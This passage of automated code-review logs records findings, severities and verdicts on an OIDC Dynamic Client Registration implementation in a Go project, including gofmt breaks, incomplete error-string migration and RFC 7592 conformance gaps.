3. **Bundle F-300, N-4, N-5, N-6 into one `/ck:revise --trace --from-finding F-301,F-300,N-4,N-5,N-6`** — they all touch the same dispatcher / config layer.
4. **Defer P2/P3 to a later cycle** — they're real but not urgent.


---

# /ck:check Findings — 2026-04-27 (4th-iteration verification)

Build site: context/plans/build-site.md
Reviewed window: 4500cc15c..HEAD = 4 commits (2 substantive: gofmt fix + 5-finding revise; 2 logs)
Base ref: 4500cc15c (previous /ck:check REVISE — N-4/N-5/F-300/F-301/N-6 the targets)
Reviewers: ck:inspector (opus, code+security combined) + ck:verifier (opus). Both converged on REVISE.
Review date: 2026-04-27

## NEW findings

| ID | Severity | Vector | File | Description | Status |
|----|----------|--------|------|-------------|--------|
| F-400 | **P0** | ci/build-break | internal/api/oidc/dcr_config.go + dcr_config_test.go | **gofmt re-broken — THIRD instance in this build window.** The 5-finding revise pass appended `"log/slog"` to dcr_config.go imports and `"time"` to dcr_config_test.go imports at the TOP of the import block instead of in alphabetical order. CI gofmt gate fails. Verified `gofmt -l` reports both files. The same wave that included a "fix CI gofmt" commit (21187afa0) re-broke the gate. Meta-pattern: every fix wave breaks gofmt. | NEW |
| F-401 | **P1** | rfc-vocabulary / impl-incomplete | internal/api/oidc/dcr/auth.go:213/226/239/248 + cmd/start/start.go:777 | **N-5 only migrated 1 of 5 sites.** Kit AC explicitly enumerates "All 401 responses (auth-first short-circuit, IAT verification failure, IAT consume failure, RAT verification failure)". Only the auth-first short-circuit at wire.go:312 was updated to use `MissingOrInvalidAccessTokenDescription`. The 4 ResolveIAT 401 paths in auth.go still emit bespoke strings; the ConsumeIAT closure in start.go still emits "initial access token cannot be consumed". **Three distinct strings let an attacker distinguish unknown-id from wrong-random vs revoked, partially defeating the F-Au004/Au005/Au006 anti-enumeration design.** Commit message claimed "all 401 responses use the canonical string" — diff doesn't match the claim. | NEW |
| F-402 | P1 | dos-clamp-silent / config-intent | internal/api/oidc/dcr/decode.go:127-131 | **F-301's clamp-down silently substitutes 100 MiB for any positive operator config above the ceiling.** An operator who sets `MaxRequestBodyBytes: 524288000` (500 MiB intentionally for large software_statement uploads) gets requests rejected at 100 MiB with envelope text naming a number they never configured. F-204 amendment requires startup REFUSE on invalid values; F-301 should likewise refuse positive values > ceiling rather than runtime-clamp. | NEW |
| F-301c-test | P1 | untested-AC | internal/api/oidc/dcr_config_test.go | **F-301 startup WARN code exists but has no regression test.** Kit AC requires WARN emission when `MaxRequestBodyBytes=-1`; code at dcr_config.go:61-65 fires the WARN but no test (à la TestDCRConfig_Validate_R5_IssuerPathWarning's slog.SetDefault + bytes.Buffer capture pattern) pins the behaviour. Silent regression risk. | NEW |
| F-403 | P2 | operator-visibility | cmd/defaults.yaml:722 | The 100 MiB ceiling is hardcoded with no mention in cmd/defaults.yaml next to MaxRequestBodyBytes. Operators can't discover the ceiling without reading source. WARN only fires for -1; positive-value operators never see it exists. | NEW |
| F-404 | P2 | dead-code / lying-semantics | internal/api/oidc/dcr/decode.go:118-122 | N-10 unaddressed — the `case max == 0: max = DefaultMaxBodyBytes` "for the test path" still coexists with F-301's `-1 → 100 MiB` and `>ceiling → 100 MiB` branches. Three different "rescue" semantics with zero comments distinguishing. Reader confusion. | NEW |
| F-405 | P3 | brittle-test | internal/api/oidc/dcr/dispatcher_test.go:730 | N-6 test embeds a duplicate `bcryptVerifier` adapter that no other test uses, and runs real bcrypt verify (millisecond latency) where the existing `stubVerifier{matchHash}` would do (microsecond). Maintenance + perf cost. | NEW |
| F-406 | P3 | error-msg-drift | internal/api/oidc/dcr/decode.go:130 | 413 envelope description embeds the post-clamp value of `max`, not the operator's configured value. For `MaxRequestBodyBytes: -1`, the 413 reads "exceeds MaxRequestBodyBytes (104857600)" — confusing for triage. | NEW |

## Verifier verdict
**REVISE** — N-5 is PARTIAL (1 of 5 sites migrated, kit AC violated by impl). F-301c missing test for the WARN behaviour. F-300 + N-4 + N-6 + F-301a + F-301b verified MET.

## Inspector verdict
**REVISE** — 1 P0 (gofmt for the THIRD time) + 3 P1 (incomplete N-5 migration, silent clamp-down, missing WARN test) + 2 P2 + 2 P3.

## Net verdict

**REVISE** — 1 P0 + 4 P1 + 2 P2 + 2 P3.

The recurring meta-pattern continues: each fix wave introduces gofmt breaks, and each fix wave's claim diverges from the actual diff. F-401 is particularly stark — the commit message asserts coverage of a kit AC that the diff demonstrably does not satisfy.

## Pattern observation (continuing)

This is now the **THIRD consecutive /ck:check pass** to report the `fix-introduces-its-own-regression` meta-pattern, AND the **third consecutive pass** to report a gofmt break. Independent observation: the loop has no pre-commit gate that runs `gofmt -l` and `grep` to verify kit-AC enumerated coverage matches the diff. Until such a gate exists, every wave will continue to ship gofmt-dirty trees and partially-implemented kit ACs.

## Recommended next actions

1. **`gofmt -w`** on the two dirty files. Same one-shot fix as last time.
2. **`/ck:revise --trace --from-finding F-401,F-402,F-301c-test`** — three substantive amendments (complete the N-5 migration; refuse positive>ceiling at startup; add the F-301 WARN regression test).
3. **Defer F-403/F-404/F-405/F-406** to next cycle.
4. **Methodology amendment recommended** at the cavekit-writing skill or `/ck:revise --trace` skill: every "fix-claims-coverage" commit MUST verify the diff against the kit AC's enumerated list. The recurring pattern is the third meta-amendment recommendation in this build.


---

# /ck:check Pass — Tier 4 Close-out (2026-04-27)

Build site: context/plans/build-site.md
Tier: 4 close-out (T-054, T-055, T-056)
Base ref: f20af5913 (post-T-057)
Reviewer: ck:inspector + ck:surveyor (Opus). Codex unavailable — `codex-review.sh` rejected by the local `codex` CLI (`--approval-mode` flag drift).

## Findings

| ID | Severity | Category | File:line | Description | Status |
|----|----------|----------|-----------|-------------|--------|
| F-001 | **P1** | spec-conformance | internal/api/oidc/dcr/manage_put.go:26-39, 120-140 | PUT response omits `client_id_issued_at`. RFC 7592 §3.2 mandates the PUT response mirror the RFC 7591 §3.2.1 client-info shape, which requires this field. GET path emits it; PUT does not. `UpdateRegisteredClientResult` doesn't even carry the issued-at value. | NEW (T-087) |
| F-002 | **P1** | bug / wrong-sentinel | internal/api/oidc/dcr/manage_put.go:115-129 | PUT response `client_secret_expires_at` hardcoded to 0 even when `OIDC.DCR.ClientSecretExpiresIn > 0` and a fresh secret was minted via `none → client_secret_*` transition. Lies about AS policy — caller relies on `0=no expiry` and never rotates. POST register path is correct (`clientSecretExpiresAtFor`). | NEW (T-088) |
| F-003 | P2 | doc/code drift | internal/query/projection/app.go:910-928 | `reduceApplicationRegistrationAccessTokenRotated` godoc says "the column is NULL'd to mirror that" when ExpiresAt is zero; code does the OPPOSITE (preserve existing column on zero). Code is correct (prevents silent lifetime extension); doc lies. | NEW (T-089) |
| F-004 | P2 | security (low-prob) / kit-clarity | internal/command/dynamic_client_registration.go:613-640 | `applicationTokenRevocations.Query()` filters by `InstanceID + EventData{clientID}` but never `ResourceOwner`. Two orgs with colliding clientIDs (snowflake-implausible) cross-pollute revocation. Kit doesn't assert collision-resistance as a security property. | RESOLVED-IN-KIT (R6 new AC: revocation scope = `(instance_id, client_id)`) |
| F-005 | P2 | acknowledged design / kit-gap | internal/command/dynamic_client_registration.go:781-808 | `DeleteRegisteredClient` does two non-atomic Pushes (revocation, then ApplicationRemoved). Kit silent on idempotency + failure semantics. Code chose revoke-first ordering for fail-safer outcome. | RESOLVED-IN-KIT (R6 AC2 + new R6 AC: idempotency, ordering rationale, partial-failure behavior) |
| F-006 | P2 | performance | internal/command/dynamic_client_registration.go:629-639 | `RevokeApplicationTokens` branch 2 has no clientID filter, scans all per-token events instance-wide. Kit residual-risk note already acknowledges this for Phase 2. | DEFERRED-PHASE2 |
| F-007 | P2 | quality / observability | internal/api/oidc/dcr/manage.go:302-311 | `VerifyRAT` silent-rehash failure swallowed without log. Operator gets zero signal that algorithm rotation is failing to persist. | NEW (T-090) |
| F-008 | P3 | quality / undocumented invariant | internal/command/dynamic_client_registration.go:646-685 | `applicationTokenRevocations.Reduce` ordering depends on global position-asc invariant. Per-token events dropped if AddedEvent not seen first. Safe today (eventstore default order); fragile to future eventstore changes. | DEFERRED |
| F-009 | P3 | confirmed-intended / kit-silent | internal/command/dynamic_client_registration.go:516-540 | Idempotent PUT writes a `.rotated` event with no other changes. Confirmed intended behavior (kit AC7 says "every successful PUT rotates"). Kit silent on storage volume implications. | DEFERRED |
| F-010 | P3 | test brittleness | internal/api/oidc/integration_test/dcr_delete_revokes_tokens_test.go:152, 171 | `Eventually` 10s timeout undocumented w.r.t. projection-lag SLO. CI lag spike → test flakes without root-cause signal. | DEFERRED |
| F-011 | P3 | defense-in-depth | internal/api/oidc/dcr/manage.go:229-249 | `MaxBodyBytes` zero falls back silently in `Decode`. No boot-time `slog.Warn` when wiring forgets to set it. | DEFERRED |

## Confirmed non-bugs (verified by inspector)

- AddQuery OR-semantics across branches sound (`internal/eventstore/search_query.go:319-322`)
- SQL ordering position-asc default — `repository/sql/postgres.go:96`
- InstanceID stamped from ctx on push — `eventstore/v3/event.go:78-79`
- `instanceInterceptor` wires DCR handler — `cmd/start/start.go:834`
- `HasRefreshToken` on `RefreshTokenRenewedEvent` correct
- `entityID=""` on `ApplicationRemovedEvent` correct (DCR is OIDC-only)

## Verifier verdict
**REVISE** — F-001 + F-002 are P1 spec-conformance bugs in T-054/T-055. T-056 PARTIAL on R6 AC2/AC3 (resolved via kit clarification, no code change required).

## Inspector verdict
**REVISE** — 0 P0, 2 P1 (F-001, F-002), 5 P2 (3 of which kit-resolved or phase-2 deferred), 4 P3.

## Net verdict

**REVISE** — 0 P0, 2 P1, 5 P2, 4 P3.

T-054..T-056 ship a structurally sound RFC 7592 manage surface. The two P1s are surgical: ~50 LOC across two files in `manage_put.go` + plumbing through `command.UpdateRegisteredClient`. Both fixes are tracked as T-087 (F-001) and T-088 (F-002) in build site Tier 7.

Tooling note: `/home/jeff/.claude/plugins/local/cavekit-marketplace/ck/scripts/codex-review.sh` invokes `codex` with `--approval-mode` which the current binary rejects. Out-of-scope for this build but the next /ck:check + Codex pass needs the script updated.

## Recommended next actions

1. `/ck:make` — pick up T-087, T-088, T-089, T-090 from Tier 7. All four are XS/S effort; one wave should clear them.
2. After T-087/T-088 land, write a new manage_put_test.go subtest pinning RFC 7592 §3.2 wire-shape (raw-JSON inspection of `client_id_issued_at` + `client_secret_expires_at` matrix on transition vs no-transition).
3. Tooling: fix `codex-review.sh` flag drift in a separate PR.
